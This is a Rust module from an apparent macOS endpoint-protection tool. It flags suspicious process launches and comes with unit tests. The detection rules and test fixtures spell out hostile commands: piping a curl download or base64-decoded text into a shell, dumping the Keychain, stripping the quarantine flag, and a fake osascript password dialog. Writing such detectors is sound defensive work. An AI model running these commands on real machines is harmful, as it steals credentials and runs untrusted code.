//! Rules for a program that just started. They look at the command line, the
//! signature and where it runs from. Used by the process watcher (polling) and
//! by the Endpoint Security client (every exec).

use vogter_model::{Activity, ActivityKind, ExecInfo, ProcessInfo, Severity};

use crate::{INTERPRETERS, process, suspicious_location};

/// `None` when nothing about this launch is worth recording.
pub fn assess_exec(e: &ExecInfo) -> Option<Activity> {
    let cmd = e.command_line();
    let lower = cmd.to_lowercase();
    let name = e.name();
    let mut best: Option<(Severity, String)> = None;
    let mut consider = |sev: Severity, why: String| {
        if best.as_ref().is_none_or(|(s, _)| sev > *s) {
            best = Some((sev, why));
        }
    };

    match name {
        // Info-stealers (AMOS, Cuckoo, ...) ask for your password with a fake dialog.
        "osascript"
            if lower.contains("hidden answer")
                || (lower.contains("display dialog") && lower.contains("password")) =>
        {
            consider(
                Severity::Critical,
                "Shows a password dialog from a script (a common way to steal your password)"
                    .into(),
            )
        }
        "osascript" if lower.contains("system events") && lower.contains("keystroke") => consider(
            Severity::Medium,
            "A script is typing keystrokes into other apps".into(),
        ),
        "security" if lower.contains("dump-keychain") => {
            consider(Severity::High, "Dumps the entire Keychain".into())
        }
        "security"
            if (lower.contains("find-generic-password")
                || lower.contains("find-internet-password"))
                && lower.contains(" -w") =>
        {
            consider(
                Severity::Medium,
                "Reads a password out of the Keychain".into(),
            )
        }
        "xattr"
            if lower.contains("com.apple.quarantine")
                || has_flag(&e.args, &["-c", "-cr", "-rc"]) =>
        {
            consider(
                Severity::Medium,
                "Removes the download quarantine flag (skips Gatekeeper's check)".into(),
            )
        }
        "spctl" if lower.contains("--master-disable") || lower.contains("--global-disable") => {
            consider(Severity::High, "Turns Gatekeeper off".into())
        }
        "dscl"
            if ["-create", "-passwd", "-append"]
                .iter()
                .any(|f| lower.contains(f)) =>
        {
            consider(
                Severity::Medium,
                "Changes user accounts or group membership".into(),
            )
        }
        "sysadminctl" if lower.contains("-adduser") || lower.contains("-resetpasswordfor") => {
            consider(
                Severity::Medium,
                "Creates a user account or resets a password".into(),
            )
        }
        "launchctl" if lower.contains(" load ") || lower.contains(" bootstrap ") => {
            consider(Severity::Low, "Registers a background job".into())
        }
        _ => {}
    }

    if INTERPRETERS.contains(&name) || name.starts_with("python") {
        let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
            .iter()
            .any(|p| lower.contains(p));
        if pipes_to_shell && (lower.contains("base64 -d") || lower.contains("base64 --decode")) {
            consider(
                Severity::High,
                "Decodes hidden (base64) code and runs it".into(),
            );
        } else if pipes_to_shell && (lower.contains("curl") || lower.contains("wget")) {
            consider(
                Severity::Medium,
                "Downloads a script and runs it immediately".into(),
            );
        }
        if let Some(loc) = e.args.iter().skip(1).find_map(|a| suspicious_location(a)) {
            consider(Severity::High, format!("Runs a script from {loc}"));
        }
    }

    // Signature and location rules shared with the periodic scan.
    let as_process = ProcessInfo {
        pid: e.pid,
        ppid: e.ppid,
        uid: e.uid,
        name: name.to_string(),
        path: Some(e.path.clone()),
        exe_exists: true,
        signing: e.signing.clone(),
    };
    if let Some(f) = process(&as_process) {
        consider(f.severity, f.title);
    }

    let (severity, why) = best?;
    if severity < Severity::Low {
        return None;
    }
    let mut detail = format!("`{cmd}`");
    if let Some(parent) = &e.parent_path {
        detail.push_str(&format!(" — started by {parent}"));
    }
    Some(
        Activity::new(
            ActivityKind::ProcessStarted,
            severity,
            format!("{name}: {why}"),
        )
        .detail(detail)
        .from_exec(e),
    )
}

fn has_flag(args: &[String], flags: &[&str]) -> bool {
    args.iter().skip(1).any(|a| flags.contains(&a.as_str()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use vogter_model::{SignatureKind, Signing};

    fn exec(path: &str, args: &[&str], kind: SignatureKind) -> ExecInfo {
        ExecInfo {
            pid: 100,
            ppid: 1,
            uid: 501,
            path: path.into(),
            args: args.iter().map(|s| s.to_string()).collect(),
            signing: Signing {
                kind,
                identifier: None,
                team_id: None,
                notarized: false,
            },
            parent_path: None,
        }
    }

    fn severity(e: &ExecInfo) -> Option<Severity> {
        assess_exec(e).map(|a| a.severity)
    }

    #[test]
    fn fake_password_prompt() {
        let e = exec(
            "/usr/bin/osascript",
            &[
                "osascript",
                "-e",
                r#"display dialog "macOS needs your password" default answer "" with hidden answer"#,
            ],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Critical));
    }

    #[test]
    fn ordinary_apple_tools_are_quiet() {
        assert_eq!(
            severity(&exec("/bin/ls", &["ls", "-la"], SignatureKind::Apple)),
            None
        );
        assert_eq!(
            severity(&exec(
                "/usr/bin/osascript",
                &["osascript", "-e", "beep"],
                SignatureKind::Apple
            )),
            None
        );
        assert_eq!(
            severity(&exec(
                "/usr/bin/security",
                &["security", "list-keychains"],
                SignatureKind::Apple
            )),
            None
        );
    }

    #[test]
    fn curl_pipe_shell() {
        let e = exec(
            "/bin/bash",
            &["bash", "-c", "curl -fsSL https://x.example/i.sh | bash"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Medium));
        let e = exec(
            "/bin/zsh",
            &["zsh", "-c", "echo aGk= | base64 -d | sh"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::High));
    }

    #[test]
    fn keychain_and_quarantine() {
        let e = exec(
            "/usr/bin/security",
            &["security", "dump-keychain", "-d"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::High));
        let e = exec(
            "/usr/bin/xattr",
            &["xattr", "-d", "com.apple.quarantine", "/tmp/x.app"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Medium));
    }

    #[test]
    fn unsigned_binary_in_tmp() {
        let e = exec("/private/tmp/.x/update", &["update"], SignatureKind::AdHoc);
        assert_eq!(severity(&e), Some(Severity::High));
    }

    #[test]
    fn script_from_downloads() {
        let e = exec(
            "/usr/bin/python3",
            &["python3", "/Users/me/Downloads/run.py"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::High));
    }
}
